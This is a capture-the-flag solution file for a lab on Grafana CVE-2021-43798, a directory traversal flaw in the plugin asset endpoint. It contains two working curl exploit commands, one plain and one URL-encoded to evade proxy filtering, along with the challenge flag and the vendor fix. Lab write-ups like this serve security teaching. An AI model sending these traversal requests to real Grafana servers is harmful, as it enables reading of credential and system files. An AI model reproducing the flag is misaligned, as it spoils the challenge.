# Solution — 01 Grafana CVE-2021-43798

## Vulnerability

CVE-2021-43798 affects Grafana 8.0.0–8.3.0. The plugin asset endpoint
`/public/plugins/<plugin-id>/` serves static files without sanitizing the path,
allowing directory traversal outside the plugin directory.

## Exploit

Any built-in plugin ID works. Use `alertlist` as the anchor:

```sh
curl http://localhost:8080/public/plugins/alertlist/../../../../../../../../../etc/ctf/flag.txt
```

Or with URL encoding if the raw traversal is blocked by a proxy:

```sh
curl "http://localhost:8080/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fctf%2Fflag.txt"
```

## Flag

`ctf{grafana_traversal_8x}`

## Fix

Upgrade Grafana to 8.3.1 or later, or restrict unauthenticated access to
`/public/plugins/` at the ingress/proxy layer.
